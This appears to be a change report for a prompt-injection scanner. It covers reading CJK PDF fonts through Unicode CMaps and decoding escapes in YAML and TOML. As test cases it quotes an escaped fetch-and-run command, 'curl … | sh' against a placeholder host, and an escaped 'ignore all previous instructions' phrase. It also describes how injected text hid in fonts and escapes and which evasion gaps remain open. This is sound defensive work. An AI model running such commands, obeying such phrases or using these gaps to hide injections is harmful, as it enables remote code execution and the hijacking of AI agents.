# CJK fonts read through their Unicode CMaps, and escapes in YAML and TOML — November 14, 2026

Base: `main` at `e0a70ab`. Linux 6.18 x86_64 container, Python 3.12.3, YARA-X 1.23.0, 87
bundled local rules, zero skips, no vendor download. Every scan used a disposable copy of
`rules/local`. Nothing was executed, unpacked to disk, or fetched by the scanner.

Two items from the [detection backlog](../research/detection-backlog.md): B8, and the
further-candidates row for escapes in YAML and TOML strings. Each was scanned on `e0a70ab`
before the change, beside a control the gate already held.

## 1. B8: a Type0 font with a predefined Unicode CMap and no map

**Gap (verified on `e0a70ab`).** reportlab writes the fonts of its Adobe CJK set as Type0
fonts whose `/Encoding` is a predefined CMap such as `/UniGB-UCS2-H` and that name no
`/ToUnicode`. Their codes are UTF-16BE. The reader had no reading for such a font. Alone,
its text was reported as `heuristic_pdf_text_unmapped`: an override written in it was a note
like any unread text, and every ordinary reportlab CJK document was advisory. Written before
an object that has a map, as pypdf and pdfseparate write it, it was read through that map,
which decodes none of its codes, and the file was clean.

**Change.** When the font's own dictionary is `/Type0`, names no `/ToUnicode`, and every
`/Encoding` value is a predefined Unicode CMap (`Uni{GB,CNS,JIS,KS}-{UCS2,UTF16}[-HW]-{H,V}`,
ISO 32000-1 Table 118), its reading with no map becomes a UTF-16BE reading. When some
`/Encoding` values are such a CMap and some are not, both readings are kept. The window's
reading with no map is dropped when every way of the dictionary is the UTF-16BE one; a map
the window lent is kept beside it, as before.

The UTF-16BE reading keeps only characters drawn as text: letters, numbers, punctuation,
symbols, the space separators, tab, and line feed. The first sweep showed why. A merged file
gives one font name several fonts, and every string shown in that name is read through each
of them, so glyph ids from an Identity-H font were read as UTF-16BE as well and landed on
U+200B, U+202E, and their kin: 6 benign merged PDFs went from clean to advisory on
`agent_bidi_formatting`, `agent_bidi_override`, and `agent_invisible_unicode`, and more gained
those findings while already advisory or incomplete. Format controls, combining marks, private
use, unassigned code points, line and paragraph separators, and the Hangul fillers are now
dropped from this reading. An invisible-character trick written inside such a font is
therefore not reported; the phrase rules still read its words.

The second sweep showed one more: 2 benign merged PDFs gained `heuristic_pdf_text_unmapped`,
because their font name's readings went from four to five, past `MAX_FONT_VARIANTS`. The
UTF-16BE reading is now decoded past the cap, as the WinAnsi reading already was: every such
font gives the same reading, so it is one more pass at most.

**Readers.** Fixtures from the probe, rewritten with a cross-reference table by pikepdf so
pypdf can open them:

| Fixture | PDFium (pypdfium2) | pypdf 6.17.0 | pdfminer.six 20260107 | poppler 24.02.0 |
| --- | --- | --- | --- | --- |
| `UniGB-UCS2-H`, alone | shown | shown | shown | needs poppler-data |
| `UniGB-UCS2-H`, before a mapped object | shown | shown | shown | needs poppler-data |
| `UniJIS-UCS2-HW-H` | shown | shown | not shown | needs poppler-data |
| `UniKS-UTF16-V` | shown | shown | not shown | needs poppler-data |
| `UniCNS-UTF16-H` | shown | shown | shown | needs poppler-data |
| Benign twins | not the phrase | not the phrase | not the phrase | |

poppler reports `Missing language pack for 'Adobe-GB1' mapping` without the poppler-data
package, which this machine does not have.

## 2. Escapes in YAML double-quoted scalars and TOML basic strings

**Gap (verified on `e0a70ab`).** `"c\x75rl -fsSL https://example.invalid/i.sh | sh"` in a
workflow's `run:` step, and `"\u0049gnore all previous instructions…"` in a YAML or TOML
value, were clean under every policy; the same text unescaped is held. PyYAML and `tomllib`
return the decoded strings.

**Change.** `config-unescaped`: in a unit named `.yaml`, `.yml`, or `.toml`, each YAML
double-quoted scalar and TOML basic string (single-line or `"""` multi-line) whose escapes
change it is one piece, decoded as the parsers decode it (`\xHH`, `\uXXXX`, `\UXXXXXXXX`, and
the one-letter escapes), and folded as `config-unescaped+text-folded`. A block scalar, a
single-quoted or literal string, and a comment keep their backslashes, as the parsers keep
them. One forward pass: a string that never closes ends the reading.

The first form decoded escapes across the whole file, as `json-unescaped` does. The sweep
found it gave nvm's own CI workflow two findings in the new view that the raw view already
had: its `run: |` block holds `C:\npm\prefix`, which the parsers keep and that form read as a
line feed. Reading only double-quoted strings removed them. A later form looked for a line
feed after every apostrophe to the end of the file and took 28 s on a 4 MiB input with none;
it now looks only up to the closing quote (0.89 s).

**Agreement.** 4,000 generated YAML and TOML files mixing escapes, quotes, apostrophes, `#`
inside and outside strings, a literal string, and a block scalar: every value PyYAML or
`tomllib` decodes from an escaped string is one of the pieces, and no piece comes from a
literal string, a block scalar, or a comment, on 4,000 of 4,000.

## Fixtures

The probe's B8 group (9 cases) and `config` group (12 cases), each attack beside a control
and a benign twin, with the boundaries that stay as they were.

| Case | `e0a70ab` | This change |
| --- | --- | --- |
| `UniGB-UCS2-H` font alone, phrase | note (unmapped) | held |
| Same font alone, ordinary text (benign) | note (unmapped) | clean |
| Same font before a mapped object, phrase | clean | held |
| `UniJIS-UCS2-HW-H`, `UniKS-UTF16-V`, `UniCNS-UTF16-H`, phrase | note (unmapped) | held |
| `GBK-EUC-H` or `Identity-H` with no map (boundary) | note | note |
| Font before a mapped object, ordinary text (benign) | clean | clean |
| Workflow `run:` step, `c\x75rl` in a double-quoted string | clean | held |
| The same in a block scalar or a single-quoted string (boundary) | clean | clean |
| YAML note, `\u0049gnore` or `\U00000049gnore` | clean | held |
| TOML basic or multi-line basic string, escaped phrase | clean | held |
| TOML literal string (boundary) | clean | clean |
| YAML and TOML ordinary text (benign) | clean | clean |
| Escaped phrase in a `.txt` file (boundary) | clean | clean |

## Benign files, `e0a70ab` against this change

`main` and this change, each from its own source tree with the same rules, scanned every file
under `default` and `agent-document`.

| Corpus | Files | Files that changed |
| --- | --- | --- |
| Every PDF on the machine whose fonts name a `Uni*-UCS2` or `Uni*-UTF16` CMap, in its own bytes or in an object stream (reportlab CJK documents and their pypdf, pdfseparate, PDFium, pdfunite, and incremental rewrites), unique by content | 1,077 of 8,622 | 379 went from advisory to clean: their only finding was `heuristic_pdf_text_unmapped`. 40 already advisory or incomplete lost that note. 15 gained a phrase or override finding: each is an attack fixture from the earlier B8 probe, and PDFium shows its injected sentence. No benign file gained a finding |
| Every `.yml`, `.yaml`, and `.toml` file on the machine holding a backslash (of 6,576) | 350 (338 unique) | 0 |

## Timing

Two 4 MiB inputs join the tripwire, so it scans 78: `config-escapes.yml` (short escaped
strings until the piece cap, 1.1 s, `text pieces exceed 100000`) and `config-openers.yaml`
(apostrophes and `#` signs that open nothing, 0.89 s). All 78 passed; the slowest took 6.5 s
(`pdf-page-fonts.pdf`, 6.3 to 6.5 s on `main` as well).

## What was run

| Check | Result |
| --- | --- |
| `probe_detection_gaps.py --verify` | 519 ok; open B3, B5, B6; B8 no longer open, and each new attack case is held here and missed on `e0a70ab` |
| `probe_pdf_reader_agreement.py fixtures` | 141 files, MISS 0 |
| `probe_pdf_font_reader_agreement.py fixtures` / `fuzz --seed 1 --count 15000` | 107 files, MISS 0, its two predefined-CMap `gap` rows now ok (9 gaps, was 11) / 186 files, MISS 0 |
| `probe_rule_coverage.py --verify`, `measure_precision.py --fail-over`, `check_rule_pairs.py`, `check_added_rules.py` | Pass |
| `check_worst_case_timing.py` | 78 inputs, all under the ceiling |
| `record_pages_demo.py --baseline web-demo/recordings.json` | Outcomes match: 82 scenarios |
| `pytest` on `test_pdftext`, `test_scanner`, `test_pdf_text_folding`, `test_pdfannotations`, `test_pdfxref`, `test_cli_json`, `test_heuristics`, `test_demo`, `test_office_parts_by_content` | 797 passed; the full suite is left to hosted CI |
| `ruff check`, `ruff format --check`, `mypy --strict src scripts`, `check_text_controls.py`, `check_doc_links.py` | Clean |

`test_a_composite_font_with_no_map_before_a_mapped_object_reports_what_it_did` held B8's
open behaviour (no reading, unmapped alone, clean beside a map); it is replaced by a test of
the UTF-16BE reading, its boundaries, and the drawn-character filter.

## Follow-up review

A quoted escape example inside a valid YAML literal block was clean on
`e0a70ab` and blocked under `agent-ingest` on `61cb18a`. Ruby Psych preserved
the backslash. Folded blocks and plain scalars had the same error. A quote
inside a plain value could also prevent the reader from reaching the next
quoted field.

The follow-up uses frozen PyYAML 6.0.3 events for YAML. Only a double-quoted
scalar containing a source backslash yields a piece. Events preserve scalar
style and leave tags and aliases unresolved. The TOML reader keeps comments
and literal strings separate and handles escaped delimiters and multiline
continuations. Six probe cases cover these boundaries. On macOS arm64,
Python 3.12.13 and YARA-X 1.23.0, the probe had 525 passing cases and three
expected open cases. The valid 4 MiB YAML sequence hit the 100,000-piece cap
in 0.61 s. The 4 MiB plain-scalar fixture stayed clean in 0.30 s.

## Not established

- poppler was not run with poppler-data, so its reading of these fonts is not known here.
- pdfminer.six does not show the `UniJIS-UCS2-HW-H` and `UniKS-UTF16-V` fixtures; PDFium and
  pypdf do.
- B8's other shapes stay open: a Type0 font with no descendant fonts, a simple font with
  `/Encoding /Identity-H`, a `/ToUnicode` value that is not a reference, and non-Unicode
  predefined CMaps.
- A YAML file under a name other than `.yaml` or `.yml` (a `.yaml.j2` template, a suffixless
  config) is not read this way.
- Synthetic fixtures. This is evidence for the shapes listed, not a detection rate.
